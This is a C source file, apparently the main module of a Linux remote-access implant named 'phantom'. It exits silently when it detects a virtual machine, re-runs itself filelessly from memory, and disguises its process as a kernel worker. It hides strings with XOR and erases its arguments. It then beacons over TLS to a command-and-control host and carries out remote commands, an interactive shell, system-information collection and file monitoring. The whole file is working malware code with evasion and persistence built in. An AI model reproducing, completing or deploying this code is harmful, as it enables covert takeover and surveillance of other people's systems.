#include "network_core.h"
#include "tls_wrapper.h"
#include "crypto_engine.h"
#include "stealth.h"
#include "phantom.h"
#include "utils.h"
#include "command_execution.h"
#include "memfd_loader.h"
#include "anti_vm.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <limits.h>
#include <pthread.h>

extern char **environ;

static void sigchld_handler(int sig) {
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

#ifdef PH_ENABLE_DEBUG_LOG
#define DEBUG_LOG(level, fmt, ...) fprintf(stderr, "[%s] " fmt, level, ##__VA_ARGS__)
#else
#define DEBUG_LOG(level, fmt, ...) do {} while (0)
#endif

typedef struct {
    char magic[4];
    uint8_t version;
    uint8_t payload[32];
} __attribute__((packed)) ph_handshake_t;

static const unsigned char OBF_KWORKER[] = {
    0xF0, 0xC0, 0xDC, 0xC4, 0xD9, 0xC0, 0xCE, 0xD9, 0x84, 0xDE, 0x9F, 0x91, 0x9B, 0xF6, 0x00
};

static void decode_kworker(char *dst, size_t dst_size) {
    size_t i;
    for (i = 0; i < dst_size; i++) dst[i] = '\0';
    for (i = 0; OBF_KWORKER[i] != 0x00 && i < dst_size - 1; i++) dst[i] = OBF_KWORKER[i] ^ 0xAB;
}

static const unsigned char OBF_PHNT[] = {0xF4, 0xEC, 0xEA, 0xF0, 0x00};

static void decode_phnt(char *dst, size_t dst_size) {
    size_t i;
    for (i = 0; i < dst_size; i++) dst[i] = '\0';
    for (i = 0; OBF_PHNT[i] != 0x00 && i < dst_size - 1; i++) dst[i] = OBF_PHNT[i] ^ 0xA4;
}

static void fatal_signal_handler(int sig) {
    const char *log_path = "/tmp/.system-runtime-cache/agent_fatal.log";
    FILE *fp = fopen(log_path, "a");
    if (fp) {
        fprintf(fp, "[FATAL] Received signal %d at %ld\n", sig, (long)time(NULL));
        fclose(fp);
    }
    _exit(1);
}

static void wipe_argv(int argc, char *argv[]) {
    for (int i = 0; i < argc; i++) {
        if (argv[i]) {
            memset(argv[i], 0, strlen(argv[i]));
        }
    }
}

int main(int argc, char *argv[]) {
    //  Evasion: Anti-VM & Stalling Logic
    if (ph_anti_vm_check()) {
        // Exit silently if VM/Sandbox detected
        _exit(0);
    }
    ph_stalling_logic();

    signal(SIGSEGV, fatal_signal_handler);
    signal(SIGABRT, fatal_signal_handler);
    signal(SIGILL, fatal_signal_handler);
    signal(SIGFPE, fatal_signal_handler);

    int already_fileless = 0;
    char exe_path[PATH_MAX];
    ssize_t exe_len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (exe_len > 0) {
        exe_path[exe_len] = '\0';
        if (strstr(exe_path, "memfd:") != NULL || strstr(exe_path, "(deleted)") != NULL) {
            already_fileless = 1;
        }
    }

    if (!already_fileless && argc > 0 && argv[0] != NULL) {
        const char *self_path = argv[0];
        FILE *self_fp = fopen(self_path, "rb");
        if (self_fp) {
            fseek(self_fp, 0, SEEK_END);
            long self_size = ftell(self_fp);
            fseek(self_fp, 0, SEEK_SET);
            if (self_size > 0 && self_size < PH_MEMFD_MAX_SIZE) {
                int memfd = (int)syscall(SYS_memfd_create, "phantom", MFD_CLOEXEC);
                if (memfd >= 0) {
                    char read_buf[4096];
                    size_t bytes_read;
                    while ((bytes_read = fread(read_buf, 1, sizeof(read_buf), self_fp)) > 0) {
                        write(memfd, read_buf, bytes_read);
                    }
                    fclose(self_fp);
                    char *new_argv[32];
                    int new_argc = 0;
                    for (int i = 0; i < argc && new_argc < 31; i++) new_argv[new_argc++] = argv[i];
                    new_argv[new_argc] = NULL;
                    fexecve(memfd, new_argv, environ);
                    exit(1);
                }
            }
            fclose(self_fp);
        }
    }

    const char *secret = NULL;
    const char *relay_host = NULL;
    const char *relay_port_str = NULL;
    int opt;

    while ((opt = getopt(argc, argv, "s:i:m:")) != -1) {
        switch (opt) {
            case 's': secret = strdup(optarg);  break;
            case 'i': relay_host = strdup(optarg); break;
            case 'm': relay_port_str = strdup(optarg); break;
        }
    }

    if (secret == NULL) {
        fprintf(stderr, "[ERROR] Secret key (-s) is mandatory for agent initialization\n");
        return 1;
    }
    if (relay_host == NULL) relay_host = strdup(DEFAULT_C2_HOST);
    if (relay_port_str == NULL) relay_port_str = strdup("443");

    ph_heap_secret_t secret_ctx;
    ph_heap_secret_init(&secret_ctx, (const uint8_t *)secret, strlen(secret));

    const char *masq_name = "[kworker/u4:0]";
    ph_stealth_ctx_t stealth_ctx;
    ph_stealth_init(&stealth_ctx, argc, argv);
    ph_stealth_spoof_process(&stealth_ctx, masq_name, masq_name);
    ph_stealth_mask_process_name(masq_name);

    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);

    ph_ed25519_keypair_t ed25519_keys;
    ph_crypto_ed25519_generate_keypair(&ed25519_keys);

    int retry_delay = 5;
    const int max_retry_delay = 300;
    int sock_fd = -1;
    wipe_argv(argc, argv);

    while (1) {
        sock_fd = ph_socket_create(AF_INET, SOCK_STREAM, 0);
        if (sock_fd < 0) { sleep(retry_delay); continue; }

        uint16_t relay_port = (uint16_t)atoi(relay_port_str);
        int conn_res = ph_socket_connect(sock_fd, relay_host, relay_port, 5000);
        
        // Fallback logic
        if (conn_res != PH_OK && strcmp(relay_host, DEFAULT_C2_HOST) == 0) {
            DEBUG_LOG("INFO", "Primary relay failed, trying fallback\n");
            conn_res = ph_socket_connect(sock_fd, FALLBACK_C2_HOST, relay_port, 5000);
        }

        if (conn_res != PH_OK) {
            ph_socket_close(sock_fd);
            sleep(retry_delay);
            retry_delay = (retry_delay * 2 > max_retry_delay) ? max_retry_delay : retry_delay * 2;
            continue;
        }

        // Ensure network byte order (Big-Endian) for the 4-byte PSK validation string "OYEN"
        uint32_t raw_psk = htonl(0x4F59454E);
        if (send(sock_fd, &raw_psk, sizeof(raw_psk), 0) != sizeof(raw_psk)) {
            // Handshake transmission failed, terminate connection attempt cleanly
            ph_socket_close(sock_fd);
            sleep(retry_delay);
            continue;
        }

        ph_tls_ctx_t tls_ctx;

        if (ph_tls_init(&tls_ctx, sock_fd, relay_host) != PH_OK) {
            ph_socket_close(sock_fd);
            sleep(5); continue;
        }

        if (ph_tls_handshake(&tls_ctx) != PH_OK) {
            ph_tls_cleanup(&tls_ctx);
            ph_socket_close(sock_fd);
            sleep(retry_delay); continue;
        }

        retry_delay = 5;
        ph_handshake_t handshake;
        char phnt_magic[5];
        decode_phnt(phnt_magic, sizeof(phnt_magic));
        memcpy(handshake.magic, phnt_magic, 4);
        handshake.version = 0x01;
        memcpy(handshake.payload, ed25519_keys.public_key, 32);
        ph_tls_send(&tls_ctx, &handshake, sizeof(handshake));

        // Launch real-time file monitoring thread
        pthread_t monitor_tid;
        pthread_create(&monitor_tid, NULL, ph_monitor_thread, &tls_ctx);
        pthread_detach(monitor_tid);

        // Send Install Success Signal
        char install_msg[] = "Installation successful";
        ph_cmd_send_chunked(&tls_ctx, install_msg, strlen(install_msg), PH_CMD_INSTALL_SUCCESS, 0);

        uint8_t recv_buffer[4096];
        ph_command_t cmd;
        ph_exec_ctx_t exec_ctx;
        char output_buffer[PH_CMD_MAX_OUTPUT_SIZE];
        int shell_active = 0;
        uint64_t last_heartbeat = ph_get_timestamp_ms();
        uint32_t heartbeat_interval = 30000 + (rand() % 15000); // Initial jitter
        memset(&exec_ctx, 0, sizeof(exec_ctx));

        while (1) {
            uint64_t now_ms = ph_get_timestamp_ms();
            if (now_ms - last_heartbeat >= heartbeat_interval) {
                ph_socket_flush(&tls_ctx);
                uint8_t hdr[11] = {'P','H','N','T', PH_CMD_PING, 0,0, 0,1, 0,0};
                ph_tls_send(&tls_ctx, hdr, 11);
                last_heartbeat = now_ms;
                heartbeat_interval = 25000 + (rand() % 20000); // Randomize next interval
            }

            fd_set readfds;
            struct timeval tv;
            FD_ZERO(&readfds);
            FD_SET(sock_fd, &readfds);
            int max_fd = sock_fd;
            if (shell_active && exec_ctx.master_fd >= 0) {
                FD_SET(exec_ctx.master_fd, &readfds);
                if (exec_ctx.master_fd > max_fd) max_fd = exec_ctx.master_fd;
            }
            tv.tv_sec = 1; tv.tv_usec = 0;

            int ready = select(max_fd + 1, &readfds, NULL, NULL, &tv);
            if (ready < 0) { if (errno == EINTR) continue; break; }
            if (ready == 0) continue;

            if (shell_active && FD_ISSET(exec_ctx.master_fd, &readfds)) {
                size_t pty_read_len = 0;
                if (ph_pty_read_output(&exec_ctx, output_buffer, sizeof(output_buffer)-1, &pty_read_len) == PH_OK && pty_read_len > 0) {
                    ph_cmd_send_chunked(&tls_ctx, output_buffer, pty_read_len, PH_CMD_SHELL, 0);
                } else {
                    shell_active = 0; ph_pty_close(&exec_ctx);
                }
            }

            if (FD_ISSET(sock_fd, &readfds)) {
                ssize_t bytes = ph_tls_recv(&tls_ctx, recv_buffer, sizeof(recv_buffer));
                if (bytes <= 0) break;

                if (ph_cmd_parse(&cmd, recv_buffer, (size_t)bytes) != PH_OK) continue;
                ph_socket_flush(&tls_ctx);

                switch (cmd.opcode) {
                    case PH_CMD_EXECUTE: {
                        ph_agent_is_busy = true;
                        if (ph_cmd_execute(&cmd, &exec_ctx) == PH_OK) {
                            size_t total_output = 0, read_len = 0;
                            while (ph_cmd_read_output(&exec_ctx, output_buffer + total_output, PH_CMD_MAX_OUTPUT_SIZE - total_output - 1, &read_len) == PH_OK && read_len > 0) {
                                total_output += read_len;
                                if (total_output >= PH_CMD_MAX_OUTPUT_SIZE - 1) break;
                            }
                            ph_cmd_wait(&exec_ctx);
                            ph_cmd_send_chunked(&tls_ctx, output_buffer, total_output, cmd.opcode, exec_ctx.result.exit_code);
                            ph_cmd_close(&exec_ctx);
                        }
                        ph_agent_is_busy = false;
                        break;
                    }
                    case PH_CMD_SHELL: {
                        if (!shell_active) {
                            memset(&exec_ctx, 0, sizeof(exec_ctx));
                            if (ph_pty_start_shell(&exec_ctx) == PH_OK) shell_active = 1;
                        } else {
                            ph_pty_write_input(&exec_ctx, (const char *)cmd.payload, cmd.payload_len);
                        }
                        break;
                    }
                    case PH_CMD_INFO: {
                        if (ph_cmd_get_system_info(output_buffer, sizeof(output_buffer)) == PH_OK) {
                            ph_cmd_send_chunked(&tls_ctx, output_buffer, strlen(output_buffer), cmd.opcode, 0);
                        }
                        break;
                    }
                    case PH_CMD_PING: {
                        last_heartbeat = now_ms;
                        ph_cmd_send_chunked(&tls_ctx, "PONG", 4, PH_CMD_PING, 0);
                        break;
                    }
                    case PH_CMD_TERMINATE: goto cleanup;
                }
            }
        }
        ph_tls_cleanup(&tls_ctx);
        ph_socket_close(sock_fd);
    }

cleanup:
    ph_socket_close(sock_fd);
    return 0;
}
